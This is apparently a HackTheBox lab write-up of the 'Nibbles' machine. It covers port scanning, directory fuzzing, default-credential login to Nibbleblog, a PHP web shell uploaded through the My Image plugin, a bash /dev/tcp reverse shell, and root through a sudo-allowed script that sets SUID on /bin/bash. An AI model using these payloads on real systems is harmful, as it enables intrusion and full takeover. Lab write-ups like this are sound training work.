---
title: "Nibbles"
date: 2023-07-04T13:02:46+02:00
tags: ["web","nibbleblog","php","linux"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Nibbles.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "This room is a Linux environment running a website powered by the Nibbleblog engine, and the version we are using has a shell vulnerability."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Nibbles
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Nibbles

![Untitled](/HTB/nibbles-icon.png)

## Tools Used

- Nmap
- Gobuster
- wfuzz
- searchsploit
- whatweb
- wappalizer


## Port Scanning

The results shows that we have two open ports one running http service at port 80 and other and other running a ssh service at port 22.

```bash
nmap -p- -sC -sV -vvv --min-rate 5000 --open -sS -n -Pn -oN escaneo 10.10.10.75
```

![Untitled](/HTB/escaneo-nibbles.png)

## Enumeration

Let’s focus on the website.

![Untitled](/HTB/nibbles-1.png)

The website shows a Hello World message only.

![Untitled](/HTB/nibbles-2.png)

If we go to the source code we can see that there is a commented line that told us where is the real website running.

![Untitled](/HTB/nibbles-3.png)

With Wfuzz I am going to fuzz the website and also the /nibbleblog/ directory.

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/FUZZ
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
 
```
![Untitled](/HTB/wfuzz-nibbles.png)

And with Wfuzz listing all archives of /nibbleblog/ directory.

![Untitled](/HTB/wfuzz3-nibbles.png)


We can find some useful information about the software of the website in the README file.

![Untitled](/HTB/nibbles-4.png)

## TTY Treatment

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
restet xterm
export TERM=xterm
```

## Gaining an Initial Foothold

With the extension of firefox called Wappalyzer we can see that the web page executes php 
code. So with the second command I search for all .php files in the directory.

The most interesting I saw, was http://10.10.10.75/nibbleblog/admin.php, that shows us a login
panel. Whenever I see this I start trying combinations, just in case I get lucky and manage
to find the password without having to use brute force with hydra, burpuiste or some similar 
program. Some of the combinations I tried were admin/admin guest/guest nibbles/nibbles 
admin/nibbles admin/nibbles admin/nibble ... Luckily I found almost the first time the 
password and the user, which was admin/nibbles.

![Untitled](/HTB/nibbles-7.png)

With `whatweb /10.10.10.75/nibbleblog` we can see the version, and with the README file too.
So let’s see if there are some vulns for that version of nibbleblog.

![Untitled](/HTB/nibbles-6.png)

In google I found one [article](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html) that don’t mention metasploit.

This article explain how works a shell vuln that helps you to do RCE with a reverse shell. The article explain that if we have credentials we can take advantage of the my image plugin preinstalled in all the nibbleblogs with our version to upload a php reverse shell.

We need now to navigate to Plugins > Mi image > Config as says the article.

![Untitled](/HTB/nibbles-8.png)

The vuln’s article says that we need to put the reverse shell as a image and ignore the warnings I uploaded this [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Let’s set up a listener in the port 4444 and

```bash
nc -lv 4444
```
 create an archive with `nano payload.php` that says this, more or less:

```php
<?php
system($_REQUEST['cmd']);
?>
```
that allows us to execute code remotely and interactively, using the url as a bash.

Once uploaded we need to move to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php and
aplicate teh file like this `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.10.75/443 0>%261"`, like u see
I changed this `&` to this `%26` as it is its urlencoded equivalent.

![Untitled](/HTB/pwnd-nibbles.png)
 

## Escalating Privilege

If we use sudo -l we observe a .sh that can be ran by sudo without password this .sh is found at /home/nibbler/personal/stuff/monitor.sh

![Untitled](/HTB/nibbles-11.png)

- If we unzip the zip we can find this .sh and modifying his content to “/bin/bash” we can run a shell with root privilege thanks to the sudo command.

	```bash
	sudo /home/nibbler/personal/stuff/monitor.sh
	```
- Another option is to create both folders /personal/stuff/ and the file monitor.sh, give it 
`chmod +x monitor.sh` permissions. Inside the monitor.sh file we put the following code:
 
	```bash
	#!/bin/bash

	chmod u+s /bin/bash
	```
 Then I do a `sudo -u root /home/nibbler/personal/stuff/monitor.sh` to gain privilegies,
 then doing `bash -p` we are now user root !!!

**Root’s flag**

![Untitled](/HTB/nibbles-13.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I learned the importance of changing the default credentials if this thing was changed maybe the exploitation of the machine gonna be more harder.
    
- Were there any novel tools or techniques employed?
    
    Other way to exploit the sudo -l by modifying the content of a .sh which let us have privesc.

**Thank you for reading, and happy hacking! 😄**
